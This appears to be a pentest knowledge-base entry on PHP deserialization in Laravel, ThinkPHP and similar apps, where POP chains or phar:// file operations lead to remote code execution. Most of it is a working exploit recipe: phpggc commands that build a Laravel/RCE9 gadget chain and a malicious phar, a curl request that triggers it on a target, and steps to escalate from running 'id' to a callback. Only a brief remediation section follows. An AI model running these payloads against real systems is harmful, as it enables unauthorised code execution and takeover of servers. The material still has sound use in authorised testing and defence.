---
title: PHP deserialization (POP chain → RCE / phar trigger)
cve: None (implementation flaw)
severity: critical
cvss: 9.0
product: Laravel / Symfony / ThinkPHP / custom PHP applications
versions: Any
ports: 80, 443
keywords: php, deserialization, pop chain, phar, unserialize, rce
entry: unserialize($_COOKIE) / phar:// file operations
verified: false
sources: Compiled from public sources (implementation flaws)
---

## Fingerprinting

- A cookie/parameter contains `O:8:"stdClass":...` or a base64-encoded serialized string;
- An upload endpoint performs file operations such as `file_exists`/`getimagesize`, and the path is controllable.

## Prerequisites

- An `unserialize` entry point or a controllable `phar://` path exists; a POP chain is available for the framework version.

## PoC

```bash
# 1) Identify serialized data
echo 'TzoyMDoi...' | base64 -d 2>/dev/null | head -c 60
# A value such as O:4:"Test":1:{...} = serialized string
```

```bash
# 2) Generate a POP chain (phpggc for Laravel; public chains for ThinkPHP)
git clone https://github.com/ambionics/phpggc.git && cd phpggc
php phpggc Laravel/RCE9 system id -b
# Output base64 and place it in the triggering parameter

# 3) Trigger through phar (exploitable even without unserialize)
php -d phar.readonly=0 phpggc -p phar -o /tmp/p.phar Laravel/RCE9 system id
# Upload p.phar, then make the endpoint open it through phar:// (file_exists, etc.)
curl -s 'https://target/api/avatar?src=phar:///tmp/p.phar/x' | head -c 200
# Result: executing id returns output = positive result
```

## Exploitation Steps

1. Find a deserialization entry point (Cookie/Token/cache);
2. Use `phpggc -l` to find an available chain (by framework/version);
3. Run `id` first, then establish a callback;
4. Evidence: output/callback logs.

## Remediation and Mitigation

- Avoid `unserialize` (use JSON); if required, add signatures/HMAC; block `phar://`.

## References

- phpggc; PHP object injection research.
